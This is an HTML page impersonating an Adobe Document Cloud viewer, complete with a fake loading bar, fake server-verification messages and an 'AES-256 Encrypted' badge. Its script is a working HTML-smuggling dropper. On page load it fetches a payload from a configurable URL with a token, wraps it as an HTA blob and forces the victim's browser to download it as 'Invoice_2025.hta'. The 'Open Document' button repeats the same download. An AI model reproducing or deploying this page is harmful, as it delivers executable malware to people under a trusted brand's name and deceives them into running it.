<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Document Cloud</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.3);
            padding: 40px 50px;
            text-align: center;
            max-width: 450px;
        }
        .logo { font-size: 50px; margin-bottom: 10px; }
        .brand { color: #ff0000; font-weight: bold; font-size: 24px; }
        h1 { color: #333; font-size: 20px; margin: 10px 0 20px; }
        .progress-bg {
            background: #e0e0e0;
            border-radius: 8px;
            height: 6px;
            margin-bottom: 15px;
            overflow: hidden;
        }
        .progress {
            background: linear-gradient(90deg, #ff0000, #cc0000);
            height: 100%;
            width: 0%;
            animation: load 3s ease-in-out forwards;
        }
        @keyframes load {
            0% { width: 0%; }
            50% { width: 60%; }
            100% { width: 100%; }
        }
        .status { color: #666; font-size: 13px; }
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #e0e0e0;
            border-top-color: #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .done { display: none; margin-top: 20px; }
        .done h3 { color: #28a745; margin-bottom: 10px; }
        .done p { color: #666; font-size: 13px; margin-bottom: 15px; }
        .btn {
            background: #ff0000;
            color: #fff;
            border: none;
            padding: 12px 30px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover { background: #cc0000; }
        .secure { color: #28a745; font-size: 11px; margin-top: 20px; }
        .footer { color: #999; font-size: 10px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📕</div>
        <div class="brand">Adobe</div>
        <h1>Document Cloud</h1>
        <div id="loading">
            <div class="progress-bg"><div class="progress"></div></div>
            <p class="status"><span class="spinner"></span><span id="stat">Preparing document...</span></p>
        </div>
        <div class="done" id="done">
            <h3>✓ Document Ready</h3>
            <p>Click below to open your document</p>
            <button class="btn" onclick="manualDownload()">Open Document</button>
        </div>
        <div class="secure">🔒 AES-256 Encrypted</div>
        <div class="footer">© 2026 Adobe Inc.</div>
    </div>

<script>
const CONFIG = {
    payloadUrl: (window.SMUGGLE_CONFIG && window.SMUGGLE_CONFIG.payloadUrl) || '/payloads/Invoice.hta',
    token: (window.SMUGGLE_CONFIG && window.SMUGGLE_CONFIG.token) || '',
    fileName: (window.SMUGGLE_CONFIG && window.SMUGGLE_CONFIG.fileName) || 'Invoice_2025.hta'
};

const fullUrl = CONFIG.payloadUrl + (CONFIG.token ? '?key=' + CONFIG.token : '');

const msgs = ["Connecting to Adobe servers...", "Verifying document...", "Preparing viewer..."];
let i = 0;

function updateStatus() {
    if (i < msgs.length) {
        document.getElementById('stat').textContent = msgs[i++];
        setTimeout(updateStatus, 800);
    }
}

async function smuggle() {
    try {
        const r = await fetch(fullUrl);
        if (!r.ok) throw new Error('Failed');
        const buf = await r.arrayBuffer();
        const blob = new Blob([buf], {type: 'application/hta'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = CONFIG.fileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        return true;
    } catch(e) { return false; }
}

function manualDownload() { smuggle(); }

async function main() {
    updateStatus();
    await new Promise(r => setTimeout(r, 2500));
    await smuggle();
    document.getElementById('loading').style.display = 'none';
    document.getElementById('done').style.display = 'block';
}

window.onload = main;
</script>
</body>
</html>
